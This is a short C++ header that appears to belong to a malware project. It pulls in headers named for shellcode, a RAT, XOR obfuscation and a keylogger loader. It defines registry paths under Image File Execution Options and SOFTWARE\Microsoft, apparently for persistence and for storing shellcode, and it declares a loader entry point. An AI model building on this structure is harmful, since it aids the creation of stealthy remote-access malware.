#pragma once
#include "shellcode.hpp"
#include "registry.hpp"
#include "xor_logger_loader.hpp"
#include "xor_obfuscation.hpp"
#include <rat.hpp>
#include <phnt.h>

inline shellcode_result g_shellcode_result;

#define IFEO_KEY LR"(SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\)"
#define SHELLCODE_KEY LR"(SOFTWARE\Microsoft\)"

std::expected<LSTATUS, const wchar_t*>
loader_main();